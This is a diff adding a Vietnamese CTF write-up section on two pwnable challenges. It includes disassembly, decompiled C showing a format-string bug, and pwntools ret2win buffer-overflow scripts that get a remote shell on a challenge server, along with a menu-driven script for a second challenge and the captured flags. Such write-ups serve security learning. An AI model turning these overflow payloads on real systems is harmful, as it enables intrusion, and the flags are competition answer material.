@@ -732,6 +732,174 @@ $1 = 251302521774070
 
 > **FLAG: flag{388580f7bac0230a0407e7d13b5afa71}**
 
+# Pwnable
+
+## Unknown Stone
+
+Đầu tiên chúng ta chạy chương trình và gỡ lỗi bằng **IDA**
+
+```asm
+public main
+main proc near
+
+argv= qword ptr -10h
+argc= dword ptr -4
+
+; __unwind {
+push    rbp
+mov     rbp, rsp
+sub     rsp, 10h
+mov     [rbp+argc], edi
+mov     [rbp+argv], rsi
+mov     rax, cs:__bss_start
+mov     ecx, 0          ; n
+mov     edx, 2          ; modes
+mov     esi, 0          ; buf
+mov     rdi, rax        ; stream
+call    _setvbuf
+mov     rax, cs:stdin@GLIBC_2_2_5
+mov     ecx, 0          ; n
+mov     edx, 2          ; modes
+mov     esi, 0          ; buf
+mov     rdi, rax        ; stream
+call    _setvbuf
+mov     rax, cs:stderr@GLIBC_2_2_5
+mov     ecx, 0          ; n
+mov     edx, 2          ; modes
+mov     esi, 0          ; buf
+mov     rdi, rax        ; stream
+call    _setvbuf
+mov     eax, 0
+call    open_portal
+mov     eax, 0
+leave
+retn
+; } // starts at 40124B
+main endp
+
+_text ends
+```
+Có thể thấy hệ thống gọi 4 hàm nhưng trong đó 3 hàm đầu là thư viện chuẩn để setup thao tác đầu vào đầu ra của người dùng nên ta sẽ bỏ qua. Hướng sự chú ý tới hàm cuối cùng là `open_portal` vào xem bên trong hàm này chứa những gì:
+
+```c
+void __cdecl open_portal()
+{
+  char stone[100]; // [rsp+0h] [rbp-70h] BYREF
+
+  printf("You found an unknown stone.\nPlease enter the stone's name:\n > ");
+  __isoc99_scanf("%s", stone);
+  printf("Inspecting the stone ***");
+  printf(stone);
+  puts("***");
+  if ( SECRET_KEY == -559038737 )
+  {
+    puts("The portal opens to a new world!");
+    win();
+  }
+  else
+  {
+    puts("The stone remains inert.");
+  }
+}
+```
+
+Ta sẽ phát hiện ra hàm `win()`. Đây là hàm mà đề bài yêu cầu chúng ta khai thác và lấy flag trong này. Đọc code chúng ta thấy ở đây:
+
+```c
+printf(stone);
+```
+
+Đây là vuln **Format String** cho phép người dùng kiểm soát đầu vào và được đọc từ hàm `scanf`
+
+Khi mình sử dụng lệnh `checksec` để kiểm tra những biện pháp bảo mật. Mình nhận ra tất cả đều đã bị tắt hoặc không có
+
+```
+RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x400000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+```
+
+Và rồi mình thấy rằng có một cách khác để ta có thể gọi hàm `win()` đơn giản hơn mà không cần phải exploit **Format String**, đó là sử dụng kỹ thuật **ret2win (BoF)**. Đây là một kỹ thuật khai thác phổ biến nhằm chuyển hướng luồng thực thi của chương trình sang một hàm cụ thể
+
+Đầu tiên chúng ta cần xác định vị trí của hàm `win()`
+
+Tiếp đến chuyển địa chỉ vừa có sang dạng **little-edian** ta có:
+
+> "f\x11@\x00\x00\x00\x00\x00" <=> 0x000000000000401166
+
+Cuối cùng chúng ta viết payload để exploit:
+
+```python
+from pwn import *
+#p = process('./unknown-stone')
+p = remote("0.cloud.chals.io", 19873)
+payload = "A"*120 + "f\x11@\x00\x00\x00\x00\x00"
+p.sendlineafter(b'> ', payload)
+p.interactive()
+p.close()
+```
+
+```shell
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0x3f bytes:
+    b'flag.txt  genie_of_past  lib  run.sh  sol_un.py  unknown-stone\n'
+flag.txt  genie_of_past  lib  run.sh  sol_un.py  unknown-stone
+```
+
+Sau đó, ta chỉ cần `cat flag.txt` nữa là xong thôi
+
+> **FLAG: flag{1e889c7ff1a070419f148174f9eb8d23}**
+
+### Bonus
+
+Một thành viên trong team mình đã viết script khác ngắn gọn hơn mà không cần phải ngồi mò địa chỉ của hàm `win()`
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+elf = ELF("./unknown-stone")
+io = remote("0.cloud.chals.io", 19873)
+io.recvuntil(b'> ')
+io.sendline(b'\x90'*120 + p64(elf.sym['win']))
+io.interactive()
+io.close()
+```
+
+## The Drum Genie
+
+Vì thời gian khá gấp gáp nên tụi mình đã không kịp writeup đầy đủ cho bài này, tuy nhiên thì tụi mình vẫn còn giữ lại script:
+
+```python
+from pwn import *
+p = process('./genie_of_past')
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sla(b'> ', b'1')
+sla(b'> ', b'1')
+sla(b'> ', b'1')
+sla(b'> ', b'1')
+sla(b'> ', b'1')
+sla(b'> ', b'1')
+sla(b'> ', b'2')
+sla(b'> ', b'0')
+sla(b'> ', b'2')
+sla(b'> ', b'1')
+sla(b'> ', b'1')
+sla(b'> ', b'1')
+sla(b'> ', b'1')
+sla(b'> ', b'\x90'*0x200)
+sla(b'> ', b'4')
+p.interactive()
+```
+
+> **FLAG: flag{36135eb45838f06ffe495e755d4ba960}**
+
 # Cryptography
 
 > Hiện tại trong team vẫn còn đang khá thiếu người chơi mảng này nên phần này tụi mình sẽ không nói đến các kỹ năng và lý thuyết chuyên sâu nhé :3
